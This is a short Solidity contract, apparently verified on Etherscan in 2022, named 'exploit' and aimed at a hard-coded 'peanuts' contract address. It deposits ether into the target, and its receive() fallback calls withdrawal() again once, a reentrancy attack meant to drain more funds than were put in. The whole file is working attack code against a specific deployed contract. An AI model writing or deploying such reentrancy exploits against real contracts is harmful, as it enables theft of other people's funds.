/**
 *Submitted for verification at Etherscan.io on 2022-07-24
*/

pragma solidity 0.8.10;

interface peanutsInterface {
    function withdrawal() external;
    function deposit() external;
}

contract exploit { 
    address internal constant peanutsContract = 0x00f4b86F1aa30a7434774f6Bc3CEe6435aE78174;
    bool internal wasCalled;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    receive() external payable {
        //peanutsInterface(peanutsContract).deposit()
        if (!wasCalled) {
            wasCalled = true;
            peanutsContract.call{value: 0.1 ether}(abi.encodeWithSignature("withdrawal()"));
        }
    }

    function depositToPeanutContract() public {
        peanutsContract.call{value: 0.1 ether}(abi.encodeWithSignature("deposit()"));
    }

    function withdrawFromPeanutContract() public onlyOwner {
        peanutsContract.call{value: 0.1 ether}(abi.encodeWithSignature("withdrawal()"));
    }
}